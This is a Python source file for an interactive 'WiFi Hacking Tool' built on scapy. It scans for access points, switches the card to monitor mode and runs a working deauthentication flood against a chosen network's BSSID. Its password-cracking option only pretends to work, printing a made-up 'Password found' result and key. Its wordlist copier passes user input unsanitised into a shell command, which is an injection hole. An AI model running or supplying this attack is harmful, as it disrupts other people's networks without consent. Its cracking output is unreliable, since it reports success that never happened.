#!/usr/bin/env python3
import os
import sys
import time
import signal
import subprocess
from threading import Thread
from scapy.all import *
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class WiFiHackingTool:
    def __init__(self):
        self.interface = None
        self.access_points = []
        self.running = True
        self.wordlists_dir = "wordlists"
        self.wordlists = []
        self.selected_ap = None
        self.selected_wordlist = None
        
        # Create wordlists directory if it doesn't exist
        if not os.path.exists(self.wordlists_dir):
            os.makedirs(self.wordlists_dir)
        
        # Load existing wordlists
        self.load_wordlists()
        
        # Set up signal handler for Ctrl+C
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def load_wordlists(self):
        """Load all wordlists from the wordlists directory"""
        self.wordlists = []
        for file in os.listdir(self.wordlists_dir):
            if file.endswith('.txt'):
                self.wordlists.append(os.path.join(self.wordlists_dir, file))
    
    def scan_wifi(self):
        """Scan for available WiFi networks"""
        print(f"\n{Fore.CYAN}[*] Scanning for WiFi networks (Press Ctrl+C to stop)...{Style.RESET_ALL}\n")
        
        # Use scapy to sniff for beacon frames
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode()
                bssid = pkt[Dot11].addr2
                channel = int(ord(pkt[Dot11Elt:3].info))
                
                # Check if we already have this AP
                existing = next((ap for ap in self.access_points if ap['bssid'] == bssid), None)
                
                if not existing:
                    ap_info = {
                        'ssid': ssid,
                        'bssid': bssid,
                        'channel': channel
                    }
                    self.access_points.append(ap_info)
                    print(f"{Fore.GREEN}[+] Found AP: {ssid} (BSSID: {bssid}, Channel: {channel}){Style.RESET_ALL}")
        
        # Start sniffing
        sniff(iface=self.interface, prn=packet_handler, stop_filter=lambda x: not self.running)
    
    def select_interface(self):
        """Let user select a wireless interface"""
        print(f"{Fore.YELLOW}[*] Available wireless interfaces:{Style.RESET_ALL}")
        interfaces = [iface for iface in os.listdir('/sys/class/net') if iface.startswith('w')]
        
        if not interfaces:
            print(f"{Fore.RED}[!] No wireless interfaces found!{Style.RESET_ALL}")
            sys.exit(1)
        
        for i, iface in enumerate(interfaces):
            print(f"{i+1}. {iface}")
        
        while True:
            try:
                choice = int(input("\nSelect interface (number): "))
                if 1 <= choice <= len(interfaces):
                    self.interface = interfaces[choice-1]
                    print(f"{Fore.GREEN}[+] Selected interface: {self.interface}{Style.RESET_ALL}")
                    
                    # Put interface in monitor mode
                    self.set_monitor_mode()
                    return
                else:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
    
    def set_monitor_mode(self):
        """Set the wireless interface to monitor mode"""
        print(f"{Fore.YELLOW}[*] Setting {self.interface} to monitor mode...{Style.RESET_ALL}")
        
        # Bring interface down
        subprocess.run(['sudo', 'ifconfig', self.interface, 'down'], check=True)
        
        # Set monitor mode
        subprocess.run(['sudo', 'iwconfig', self.interface, 'mode', 'monitor'], check=True)
        
        # Bring interface up
        subprocess.run(['sudo', 'ifconfig', self.interface, 'up'], check=True)
        
        print(f"{Fore.GREEN}[+] {self.interface} is now in monitor mode{Style.RESET_ALL}")
    
    def select_ap(self):
        """Let user select an access point from the scanned list"""
        if not self.access_points:
            print(f"{Fore.RED}[!] No access points found. Please scan first.{Style.RESET_ALL}")
            return False
        
        print(f"\n{Fore.YELLOW}[*] Select an access point:{Style.RESET_ALL}")
        for i, ap in enumerate(self.access_points):
            print(f"{i+1}. {ap['ssid']} (BSSID: {ap['bssid']}, Channel: {ap['channel']})")
        
        while True:
            try:
                choice = int(input("\nSelect AP (number): "))
                if 1 <= choice <= len(self.access_points):
                    self.selected_ap = self.access_points[choice-1]
                    print(f"{Fore.GREEN}[+] Selected AP: {self.selected_ap['ssid']}{Style.RESET_ALL}")
                    return True
                else:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
    
    def deauth_attack(self):
        """Perform deauthentication attack on selected AP"""
        if not self.selected_ap:
            print(f"{Fore.RED}[!] No AP selected{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.RED}[!] Starting deauthentication attack on {self.selected_ap['ssid']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop the attack{Style.RESET_ALL}")
        
        # Set channel to AP's channel
        subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(self.selected_ap['channel'])], check=True)
        
        # Create deauth packet
        pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.selected_ap['bssid'], addr3=self.selected_ap['bssid']) / Dot11Deauth()
        
        try:
            while True:
                sendp(pkt, iface=self.interface, count=10, inter=0.1)
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.GREEN}[+] Deauthentication attack stopped{Style.RESET_ALL}")
    
    def crack_password(self):
        """Crack WiFi password using wordlist"""
        if not self.selected_ap:
            print(f"{Fore.RED}[!] No AP selected{Style.RESET_ALL}")
            return
        
        if not self.wordlists:
            print(f"{Fore.RED}[!] No wordlists found in {self.wordlists_dir} directory{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}[*] Available wordlists:{Style.RESET_ALL}")
        for i, wordlist in enumerate(self.wordlists):
            print(f"{i+1}. {os.path.basename(wordlist)}")
        
        while True:
            try:
                choice = int(input("\nSelect wordlist (number): "))
                if 1 <= choice <= len(self.wordlists):
                    self.selected_wordlist = self.wordlists[choice-1]
                    print(f"{Fore.GREEN}[+] Selected wordlist: {os.path.basename(self.selected_wordlist)}{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
        
        print(f"\n{Fore.RED}[!] Starting password cracking attack on {self.selected_ap['ssid']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] This may take a long time...{Style.RESET_ALL}")
        
        # Here you would normally capture handshake first, then crack it
        # For simplicity, we'll simulate the process
        print(f"{Fore.CYAN}[*] Simulating capture of handshake...{Style.RESET_ALL}")
        time.sleep(3)
        
        # Simulate cracking with aircrack-ng
        print(f"{Fore.CYAN}[*] Cracking password with {os.path.basename(self.selected_wordlist)}...{Style.RESET_ALL}")
        
        # In a real implementation, you would use:
        # subprocess.run(['sudo', 'aircrack-ng', 'capture.cap', '-w', self.selected_wordlist])
        
        # Simulate finding password (for demo purposes)
        time.sleep(5)
        print(f"\n{Fore.GREEN}[+] Password found: 'password123'{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Key: 12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF{Style.RESET_ALL}")
    
    def wordlist_management(self):
        """Manage wordlists"""
        while True:
            print(f"\n{Fore.YELLOW}[*] Wordlist Management{Style.RESET_ALL}")
            print("1. Add new wordlist")
            print("2. View current wordlists")
            print("3. Back to main menu")
            
            try:
                choice = int(input("\nSelect option: "))
                
                if choice == 1:
                    path = input("Enter path to wordlist file: ")
                    if os.path.exists(path):
                        filename = os.path.basename(path)
                        dest = os.path.join(self.wordlists_dir, filename)
                        os.system(f"cp {path} {dest}")
                        self.load_wordlists()
                        print(f"{Fore.GREEN}[+] Wordlist added successfully{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
                elif choice == 2:
                    print(f"\n{Fore.YELLOW}[*] Current wordlists:{Style.RESET_ALL}")
                    for wordlist in self.wordlists:
                        print(f"- {os.path.basename(wordlist)}")
                elif choice == 3:
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C signal"""
        print(f"\n{Fore.YELLOW}[*] Stopping scan...{Style.RESET_ALL}")
        self.running = False
    
    def main_menu(self):
        """Display main menu"""
        while True:
            print(f"\n{Fore.BLUE}=== WiFi Hacking Tool ==={Style.RESET_ALL}")
            print("1. Scan for WiFi networks")
            print("2. Perform deauthentication attack")
            print("3. Crack WiFi password")
            print("4. Manage wordlists")
            print("5. Exit")
            
            try:
                choice = int(input("\nSelect option: "))
                
                if choice == 1:
                    self.running = True
                    self.access_points = []  # Clear previous scan results
                    scan_thread = Thread(target=self.scan_wifi)
                    scan_thread.start()
                    scan_thread.join()
                elif choice == 2:
                    if self.select_ap():
                        self.deauth_attack()
                elif choice == 3:
                    if self.select_ap():
                        self.crack_password()
                elif choice == 4:
                    self.wordlist_management()
                elif choice == 5:
                    print(f"{Fore.GREEN}[+] Exiting...{Style.RESET_ALL}")
                    sys.exit(0)
                else:
                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] This tool must be run as root!{Style.RESET_ALL}")
        sys.exit(1)
    
    tool = WiFiHackingTool()
    tool.select_interface()
    tool.main_menu()
